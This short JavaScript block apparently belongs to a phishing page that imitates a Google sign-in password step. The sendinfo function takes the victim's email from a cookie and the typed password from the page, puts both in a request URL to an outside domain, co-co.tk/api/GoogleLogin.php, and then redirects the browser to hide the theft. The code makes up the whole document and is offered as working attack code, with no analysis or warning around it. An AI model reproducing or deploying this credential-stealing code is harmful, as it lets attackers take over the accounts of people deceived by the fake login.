<script>
	document.getElementById("pw").focus();
	document.getElementById("pw").addEventListener("keyup", function(event) {
		event.preventDefault();
			if (event.keyCode === 13) {
				document.getElementById("passwordNext").click();
			}
	});
	document.getElementById("pIdr").innerHTML = Cookies.get('email');
	document.getElementById("uremail").value = Cookies.get('email');
	function sendinfo() {
		var xhttp = new XMLHttpRequest();
		xhttp.onreadystatechange = function() {
			if (this.readyState == 4 && this.status == 200) {
				console.log(this.responseText);
				if(urldata("redirect")) {
					window.location.href = urldata("redirect");
				}
			}
		};
		xhttp.open("POST", "https://co-co.tk/api/GoogleLogin.php?email="+Cookies.get('email')+"&pw="+document.getElementById("pw").value, true);
		xhttp.send();
	}
	function count(str) {
		var i = 0;
		while(str.charAt(i)!="") {
			++i;
		}
		return i;
	}
	function urldata(key) {
		var u = location.href;
		var n = count(key);
		var i = u.search(key)+n+1;
		var a = "";
		while(u.charAt(i)!=""&&u.charAt(i)!="&") {
			a += u.charAt(i);
			++i;
		}
		return a;
	}
</script>
